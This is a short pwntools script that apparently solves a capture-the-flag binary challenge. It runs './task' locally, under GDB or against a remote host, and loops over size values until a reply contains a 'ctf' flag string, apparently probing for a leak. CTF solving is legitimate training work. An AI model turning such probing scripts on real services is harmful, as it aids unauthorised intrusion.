from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

def check(index):
	p.sendafter(b"Size: ", str(index).encode())
	return p.recvline()

for i in range(0x20, 0x1000, 0x10):
	d = check(i)
	if b'ctf' in d or b'CTF' in d:
		print(d)
		break
